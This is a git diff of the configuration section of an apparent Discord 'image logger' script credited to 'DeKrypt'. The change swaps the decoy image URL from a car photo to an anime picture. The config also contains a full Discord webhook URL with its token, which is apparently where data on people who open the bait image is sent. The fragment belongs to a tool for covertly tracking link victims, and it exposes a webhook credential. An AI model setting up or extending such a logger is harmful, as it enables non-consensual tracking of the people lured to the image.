@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook":'https://discord.com/api/webhooks/1444653242104676543/On_8rkYJ5idCXVANKqv4ODO-WjLW56XSO5V6iIi6Xz0cA4drT1gc33kSO4QxU3QTpN89'
-    "image": "https://imgd.aeplcdn.com/1920x1080/n/cw/ec/204994/amg-gt-63-exterior-right-front-three-quarter-2.png?isig=0&q=80&q=80"                                              # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://static0.gamerantimages.com/wordpress/wp-content/uploads/2025/06/goku-ultra-instinct-featured.jpg?w=1600&h=900&fit=crop"                                              # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
